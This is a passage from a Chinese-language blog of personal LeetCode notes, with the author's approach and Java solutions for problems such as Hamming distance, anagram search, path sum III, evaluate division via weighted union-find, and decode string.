<p>可以计算出add的值（target + sum为奇数则无解）。然后转换为背包问题每个数字选一次，有多少个方案能够使得背包容量为add被填满</p>
<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">findTargetSumWays</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">int</span> target)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> Arrays.stream(nums).sum();</span><br><span class="line">        <span class="keyword">if</span>(((target + sum) &amp; <span class="number">1</span>) != <span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">amount</span> <span class="operator">=</span> (target + sum) &gt;&gt; <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span>(amount &lt; <span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span>[] dp = <span class="keyword">new</span> <span class="title class_">int</span>[amount + <span class="number">1</span>];</span><br><span class="line">        dp[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">        <span class="comment">//dp[i][j] = dp[i-1][j] + dp[i-1][j - ???]</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">curSum</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> num : nums) &#123;</span><br><span class="line">            curSum += num;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> Integer.min(curSum, amount); j &gt;= num; j--)&#123;</span><br><span class="line">                dp[j] += dp[j - num];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[amount];        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因为数字个数很少，只有20个，可以搜索回溯的方法做最大时间复杂度2**20</p>
<h3 id="461-汉明距离"><a href="#461-汉明距离" class="headerlink" title="461. 汉明距离"></a><a href="https://leetcode.cn/problems/hamming-distance/">461. 汉明距离</a></h3><p>思路：遍历每位即可。</p>
<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hammingDistance</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span> &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">int</span> <span class="variable">BIT_COUNT</span> <span class="operator">=</span> <span class="number">31</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; BIT_COUNT; i++) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">maskX</span> <span class="operator">=</span> x &amp; (<span class="number">1</span> &lt;&lt; i);</span><br><span class="line">            <span class="type">int</span> <span class="variable">maskY</span> <span class="operator">=</span> y &amp; (<span class="number">1</span> &lt;&lt; i);</span><br><span class="line">            <span class="keyword">if</span>(maskX != maskY) res++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="448-找到所有数组中消失的数字"><a href="#448-找到所有数组中消失的数字" class="headerlink" title="448. 找到所有数组中消失的数字"></a><a href="https://leetcode.cn/problems/find-all-numbers-disappeared-in-an-array/">448. 找到所有数组中消失的数字</a></h3><p>思路：把数字放在对应的位置上，有多个即为重复</p>
<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> List&lt;Integer&gt; <span class="title function_">findDisappearedNumbers</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">length</span> <span class="operator">=</span> nums.length;</span><br><span class="line">        List&lt;Integer&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; length; i++) &#123;</span><br><span class="line">            <span class="keyword">while</span> (nums[i] != nums[nums[i] - <span class="number">1</span>])&#123;</span><br><span class="line">                <span class="type">int</span> <span class="variable">temp</span> <span class="operator">=</span> nums[nums[i] - <span class="number">1</span>];</span><br><span class="line">                nums[nums[i] - <span class="number">1</span>] = nums[i];</span><br><span class="line">                nums[i] = temp;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; length; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(nums[i] != i + <span class="number">1</span>) list.add(i + <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> list;        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="438-找到字符串中所有字母异位词"><a href="#438-找到字符串中所有字母异位词" class="headerlink" title="438. 找到字符串中所有字母异位词"></a><a href="https://leetcode.cn/problems/find-all-anagrams-in-a-string/">438. 找到字符串中所有字母异位词</a></h3><p>思路：滑动窗口 即可 —&gt; 都不用滑动了，直接hashMap记录相关即可(这是定长滑动窗口)</p>
<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> List&lt;Integer&gt; <span class="title function_">findAnagrams</span><span class="params">(String s, String p)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">targetTypeCount</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        Map&lt;Character, Integer&gt; targetMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        Map&lt;Character, Integer&gt; curMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; p.length(); i++) &#123;</span><br><span class="line">            targetMap.merge(p.charAt(i), <span class="number">1</span>, Integer::sum);</span><br><span class="line">            <span class="keyword">if</span> (targetMap.get(p.charAt(i)) == <span class="number">1</span>) targetTypeCount++;</span><br><span class="line">        &#125;</span><br><span class="line">        List&lt;Integer&gt; res = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        <span class="type">int</span> <span class="variable">m</span> <span class="operator">=</span> s.length();</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> p.length();</span><br><span class="line">        <span class="keyword">if</span> (m &lt; n) <span class="keyword">return</span> res;</span><br><span class="line">        <span class="type">int</span> <span class="variable">curTypeCount</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="type">char</span> <span class="variable">ch</span> <span class="operator">=</span> s.charAt(i);</span><br><span class="line">            curMap.merge(ch, <span class="number">1</span>, Integer::sum);</span><br><span class="line">            <span class="keyword">if</span> (Objects.equals(curMap.get(ch), targetMap.getOrDefault(ch, -<span class="number">1</span>))) curTypeCount++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (curTypeCount == targetTypeCount) res.add(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> n; i &lt; m; i++) &#123;</span><br><span class="line">            <span class="type">char</span> <span class="variable">preCh</span> <span class="operator">=</span> s.charAt(i - n);</span><br><span class="line">            <span class="keyword">if</span> (Objects.equals(curMap.get(preCh), targetMap.getOrDefault(preCh, -<span class="number">1</span>)))&#123;</span><br><span class="line">                curTypeCount--;</span><br><span class="line">            &#125;</span><br><span class="line">            curMap.merge(preCh, -<span class="number">1</span>, Integer::sum);</span><br><span class="line">            <span class="type">char</span> <span class="variable">ch</span> <span class="operator">=</span> s.charAt(i);</span><br><span class="line">            curMap.merge(ch, <span class="number">1</span>, Integer::sum);</span><br><span class="line">            <span class="keyword">if</span> (Objects.equals(curMap.get(ch), targetMap.getOrDefault(ch, -<span class="number">1</span>)))&#123;</span><br><span class="line">                curTypeCount++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (curTypeCount == targetTypeCount) res.add(i - n + <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>不定长滑动窗口：枚举右端点，发现字母出现次数大于目标次数则左移左端点</p>
<h3 id="30题了"><a href="#30题了" class="headerlink" title="30题了"></a>30题了</h3><h3 id="437-路径总和-III"><a href="#437-路径总和-III" class="headerlink" title="437. 路径总和 III"></a><a href="https://leetcode.cn/problems/path-sum-iii/">437. 路径总和 III</a></h3><p>思路：深搜加回溯能过，但还有简单方法。使用递归加前缀和思想加hash表，从根节点下去的路径看出数组。</p>
<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * public class TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode left;</span></span><br><span class="line"><span class="comment"> *     TreeNode right;</span></span><br><span class="line"><span class="comment"> *     TreeNode() &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val) &#123; this.val = val; &#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val, TreeNode left, TreeNode right) &#123;</span></span><br><span class="line"><span class="comment"> *         this.val = val;</span></span><br><span class="line"><span class="comment"> *         this.left = left;</span></span><br><span class="line"><span class="comment"> *         this.right = right;</span></span><br><span class="line"><span class="comment"> *     &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="type">int</span> res;</span><br><span class="line">    Map&lt;Long, Integer&gt; record = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">pathSum</span><span class="params">(TreeNode root, <span class="type">int</span> targetSum)</span> &#123;</span><br><span class="line">        record.put(<span class="number">0L</span>, <span class="number">1</span>);</span><br><span class="line">        dfs(root, targetSum, <span class="number">0L</span>);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">dfs</span><span class="params">(TreeNode root, <span class="type">int</span> targetSum, <span class="type">long</span> curSum)</span>&#123;</span><br><span class="line">        <span class="comment">//到达该结点，类似与到达数组尾部</span></span><br><span class="line">        <span class="keyword">if</span>(root == <span class="literal">null</span>) <span class="keyword">return</span>;</span><br><span class="line">        curSum += root.val;</span><br><span class="line">        res += record.getOrDefault(curSum - targetSum, <span class="number">0</span>);</span><br><span class="line">        record.merge(curSum, <span class="number">1</span>, Integer::sum);</span><br><span class="line">        dfs(root.left, targetSum, curSum);</span><br><span class="line">        dfs(root.right, targetSum, curSum);</span><br><span class="line">        <span class="comment">//回溯</span></span><br><span class="line">        record.merge(curSum, -<span class="number">1</span>, Integer::sum);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>有个坑点是得用Long</p>
<h3 id="416-分割等和子集"><a href="#416-分割等和子集" class="headerlink" title="416. 分割等和子集"></a><a href="https://leetcode.cn/problems/partition-equal-subset-sum/">416. 分割等和子集</a></h3><p>思路：一眼背包问题</p>
<p>代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">canPartition</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> Arrays.stream(nums).sum();</span><br><span class="line">        <span class="keyword">if</span>((sum &amp; <span class="number">1</span>) != <span class="number">0</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> nums.length;</span><br><span class="line">        <span class="type">boolean</span>[] dp = <span class="keyword">new</span> <span class="title class_">boolean</span>[sum / <span class="number">2</span> + <span class="number">1</span>];</span><br><span class="line">        dp[<span class="number">0</span>] = <span class="literal">true</span>;</span><br><span class="line">        <span class="comment">//dp[i][j] = dp[i-1][j] | dp[i-1][j - num]</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">curSum</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            curSum += nums[i];</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> Integer.min(curSum, sum / <span class="number">2</span>); j &gt;= nums[i]; j--)&#123;</span><br><span class="line">                dp[j] |= dp[j - nums[i]];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[sum / <span class="number">2</span>];        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="406-根据身高重建队列"><a href="#406-根据身高重建队列" class="headerlink" title="406. 根据身高重建队列"></a><a href="https://leetcode.cn/problems/queue-reconstruction-by-height/">406. 根据身高重建队列</a></h3><p>思路：需要单调栈辅助或者排序粗看。思路先排序，根据身高降序，根据ki升序，插入到对应位置即可</p>
<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[][] reconstructQueue(<span class="type">int</span>[][] people) &#123;</span><br><span class="line">        Arrays.sort(people, (Comparator&lt;<span class="type">int</span>[]&gt;) (o1, o2) -&gt; &#123;</span><br><span class="line">            <span class="keyword">if</span>(o1[<span class="number">0</span>] == o2[<span class="number">0</span>])&#123;</span><br><span class="line">                <span class="keyword">return</span> o1[<span class="number">1</span>] - o2[<span class="number">1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> o2[<span class="number">0</span>] - o1[<span class="number">0</span>];</span><br><span class="line">        &#125;);</span><br><span class="line">        List&lt;<span class="type">int</span>[]&gt; res = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        <span class="type">int</span> <span class="variable">m</span> <span class="operator">=</span> people.length;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">            res.add(people[i][<span class="number">1</span>], people[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res.toArray(<span class="keyword">new</span> <span class="title class_">int</span>[people.length][<span class="number">2</span>]);        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="399-除法求值"><a href="#399-除法求值" class="headerlink" title="399. 除法求值"></a><a href="https://leetcode.cn/problems/evaluate-division/">399. 除法求值</a></h3><p><a href="https://leetcode.cn/problems/evaluate-division/solutions/548634/399-chu-fa-qiu-zhi-nan-du-zhong-deng-286-w45d/?envType=problem-list-v2&envId=2cktkvj">399. 除法求值题解 - 力扣（LeetCode）</a></p>
<p>并查集, 比例用value表示(感觉这题挺难的)</p>
<p>一边查询一边修改结点指向是并查集的特色</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">UnionFind</span>&#123;</span><br><span class="line">        <span class="type">double</span>[] weights;<span class="comment">//表示跟父节点的比例关系，比如a/b = 2 b结点就为父节点，a的值就为2</span></span><br><span class="line">        <span class="type">int</span>[] parents;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">UnionFind</span><span class="params">(<span class="type">int</span> n)</span> &#123;</span><br><span class="line">            weights = <span class="keyword">new</span> <span class="title class_">double</span>[n];</span><br><span class="line">            parents = <span class="keyword">new</span> <span class="title class_">int</span>[n];</span><br><span class="line">            Arrays.fill(weights, <span class="number">1.0</span>);</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">                parents[i] = i;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="title function_">find</span><span class="params">(<span class="type">int</span> child)</span>&#123;</span><br><span class="line">           <span class="keyword">if</span>(child != parents[child])&#123;</span><br><span class="line">               <span class="type">int</span> <span class="variable">preParent</span> <span class="operator">=</span> parents[child];</span><br><span class="line">               parents[child] = find(parents[child]);</span><br><span class="line">               weights[child] *= weights[preParent];</span><br><span class="line"><span class="comment">//               if(preParent != parents[x]) weights[x] *= weights[preParent];因为头部保障为1，所以这里没必要判断</span></span><br><span class="line">           &#125;</span><br><span class="line">           <span class="keyword">return</span> parents[child];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">void</span> <span class="title function_">connect</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y, <span class="type">double</span> val)</span>&#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">parentX</span> <span class="operator">=</span> find(x);</span><br><span class="line">            <span class="type">int</span> <span class="variable">parentY</span> <span class="operator">=</span> find(y);</span><br><span class="line">            <span class="keyword">if</span>(parentX == parentY) <span class="keyword">return</span>;</span><br><span class="line">            parents[parentX] = parentY;</span><br><span class="line">            weights[parentX] = val * weights[y] / weights[x];</span><br><span class="line">            <span class="comment">// x(weight[x]) -&gt; find(x)</span></span><br><span class="line">            <span class="comment">// x(val) -&gt; y(weight[y]) -&gt; find(y)</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">double</span> <span class="title function_">is_connect</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span>&#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">parentX</span> <span class="operator">=</span> find(x);</span><br><span class="line">            <span class="type">int</span> <span class="variable">parentY</span> <span class="operator">=</span> find(y);</span><br><span class="line">            <span class="keyword">if</span>(parentX != parentY) <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">return</span> weights[x] / weights[y];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">double</span>[] calcEquation(List&lt;List&lt;String&gt;&gt; equations, <span class="type">double</span>[] values, List&lt;List&lt;String&gt;&gt; queries) &#123;</span><br><span class="line">        Map&lt;String, Integer&gt; stringIntegerMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (List&lt;String&gt; equation : equations) &#123;</span><br><span class="line">            <span class="keyword">if</span>(!stringIntegerMap.containsKey(equation.get(<span class="number">0</span>))) &#123;</span><br><span class="line">                stringIntegerMap.put(equation.get(<span class="number">0</span>), count);</span><br><span class="line">                count++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(!stringIntegerMap.containsKey(equation.get(<span class="number">1</span>))) &#123;</span><br><span class="line">                stringIntegerMap.put(equation.get(<span class="number">1</span>), count);</span><br><span class="line">                count++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">UnionFind</span> <span class="variable">unionFind</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UnionFind</span>(count);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; values.length; i++) &#123;</span><br><span class="line">            unionFind.connect(stringIntegerMap.get(equations.get(i).get(<span class="number">0</span>)), stringIntegerMap.get(equations.get(i).get(<span class="number">1</span>)), values[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> queries.size();</span><br><span class="line">        <span class="type">double</span>[] res = <span class="keyword">new</span> <span class="title class_">double</span>[n];</span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (List&lt;String&gt; query : queries) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">x</span> <span class="operator">=</span> stringIntegerMap.getOrDefault(query.get(<span class="number">0</span>), -<span class="number">1</span>);</span><br><span class="line">            <span class="type">int</span> <span class="variable">y</span> <span class="operator">=</span> stringIntegerMap.getOrDefault(query.get(<span class="number">1</span>), -<span class="number">1</span>);</span><br><span class="line">            <span class="keyword">if</span>(x == -<span class="number">1</span> || y == -<span class="number">1</span>) res[i] = -<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                res[i] = unionFind.is_connect(x, y);</span><br><span class="line">            &#125;</span><br><span class="line">            i++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="394-字符串解码"><a href="#394-字符串解码" class="headerlink" title="394. 字符串解码"></a><a href="https://leetcode.cn/problems/decode-string/">394. 字符串解码</a></h3><p>思路：递归解析即可</p>
<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">decodeString</span><span class="params">(String s)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> decodeString(s, <span class="number">0</span>, s.length() - <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">decodeString</span><span class="params">(String s, <span class="type">int</span> leftIndex, <span class="type">int</span> rightIndex)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">stringBuilder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> leftIndex;</span><br><span class="line">        <span class="keyword">while</span> (i &lt;= rightIndex)&#123;</span><br><span class="line">            <span class="type">char</span> <span class="variable">ch</span> <span class="operator">=</span> s.charAt(i);</span><br><span class="line">            <span class="keyword">if</span>(Character.isDigit(ch))&#123;</span><br><span class="line">                <span class="type">int</span> <span class="variable">num</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">                num = num * <span class="number">10</span> + ch - <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">                i++;</span><br><span class="line">                <span class="keyword">while</span> ((ch = s.charAt(i)) != <span class="string">&#x27;[&#x27;</span>)&#123;</span><br><span class="line">                    num = num * <span class="number">10</span> + ch - <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">                    i++;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">//现在是[符号</span></span><br><span class="line">                <span class="type">int</span> <span class="variable">leftCloseIndex</span> <span class="operator">=</span> i;</span><br><span class="line">                <span class="comment">//i++后是其它符号了</span></span><br><span class="line">                i++;</span><br><span class="line">                <span class="type">int</span> <span class="variable">closeCount</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">while</span> (closeCount != <span class="number">0</span>)&#123;</span><br><span class="line">                    ch = s.charAt(i);</span><br><span class="line">                    <span class="keyword">if</span>(ch == <span class="string">&#x27;[&#x27;</span>) closeCount++;</span><br><span class="line">                    <span class="keyword">else</span> <span class="keyword">if</span>(ch == <span class="string">&#x27;]&#x27;</span>) closeCount--;</span><br><span class="line">                    i++;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="type">int</span> <span class="variable">rightCloseIndex</span> <span class="operator">=</span> i - <span class="number">1</span>;</span><br><span class="line">                <span class="type">String</span> <span class="variable">tempString</span> <span class="operator">=</span> decodeString(s, leftCloseIndex + <span class="number">1</span>, rightCloseIndex - <span class="number">1</span>);</span><br><span class="line">                <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; num; j++)&#123;</span><br><span class="line">                    stringBuilder.append(tempString);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">//现在是[后面的符号，可能结束了也</span></span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(Character.isLowerCase(ch))&#123;</span><br><span class="line">                stringBuilder.append(ch);</span><br><span class="line">                i++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> stringBuilder.toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里i的控制要清楚，我这里更新的定义是后面会用到的i，每次都是最后更新避免出问题</p>
<p>思路二：使用栈</p>
<p>代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class Solution &#123;</span><br><span class="line">    public String decodeString(String s) &#123;</span><br><span class="line">        Stack&lt;String&gt; strStack = new Stack&lt;&gt;();</span><br><span class="line">        Stack&lt;Integer&gt; numStack = new Stack&lt;&gt;();</span><br><span class="line">        StringBuilder cur = new StringBuilder();</span><br><span class="line">        int num = 0;</span><br><span class="line">        for (int i = 0; i &lt; s.length(); i++) &#123;</span><br><span class="line">            char ch = s.charAt(i);</span><br><span class="line">            if(ch == &#x27;[&#x27;)&#123;</span><br><span class="line">                numStack.push(num);</span><br><span class="line">                strStack.add(cur.toString());</span><br><span class="line">                cur = new StringBuilder();</span><br><span class="line">                num = 0;</span><br><span class="line">            &#125;else if(ch == &#x27;]&#x27;)&#123;</span><br><span class="line">                int repeatNum = numStack.pop();</span><br><span class="line">                StringBuilder temp = new StringBuilder();</span><br><span class="line">                for (int j = 0; j &lt; repeatNum; j++) &#123;</span><br><span class="line">                    temp.append(cur);</span><br><span class="line">                &#125;</span><br><span class="line">                cur = new StringBuilder(strStack.pop() + temp);</span><br><span class="line">            &#125;else if(Character.isDigit(ch))&#123;</span><br><span class="line">                num = num * 10 + ch - &#x27;0&#x27;;</span><br><span class="line">            &#125;else &#123;</span><br><span class="line">                cur.append(ch);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return cur.toString();      </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="347-前-K-个高频元素"><a href="#347-前-K-个高频元素" class="headerlink" title="347. 前 K 个高频元素"></a><a href="https://leetcode.cn/problems/top-k-frequent-elements/">347. 前 K 个高频元素</a></h3><p>思路一：treeMap直接排</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] topKFrequent(<span class="type">int</span>[] nums, <span class="type">int</span> k) &#123;</span><br><span class="line">        Map&lt;Integer, Integer&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> num : nums) &#123;</span><br><span class="line">            map.merge(num, <span class="number">1</span>, Integer::sum);</span><br><span class="line">        &#125;</span><br><span class="line">        TreeMap&lt;Integer, List&lt;Integer&gt;&gt; treeMap = <span class="keyword">new</span> <span class="title class_">TreeMap</span>&lt;&gt;(Comparator.reverseOrder());</span><br><span class="line">        <span class="keyword">for</span> (Map.Entry&lt;Integer, Integer&gt; entry : map.entrySet()) &#123;</span><br><span class="line">            treeMap.computeIfAbsent(entry.getValue(), t -&gt; <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;()).add(entry.getKey());        &#125;</span><br><span class="line">        <span class="type">int</span>[] res = <span class="keyword">new</span> <span class="title class_">int</span>[k];</span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (Map.Entry&lt;Integer, List&lt;Integer&gt;&gt; entry : treeMap.entrySet()) &#123;</span><br><span class="line">            <span class="keyword">for</span> (Integer integer : entry.getValue()) &#123;</span><br><span class="line">                res[i] = integer;</span><br><span class="line">                i++;</span><br><span class="line">                <span class="keyword">if</span>(i == k) <span class="keyword">return</span> res;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>思路二：堆</p>
<p>todo</p>
<p>思路三快排</p>
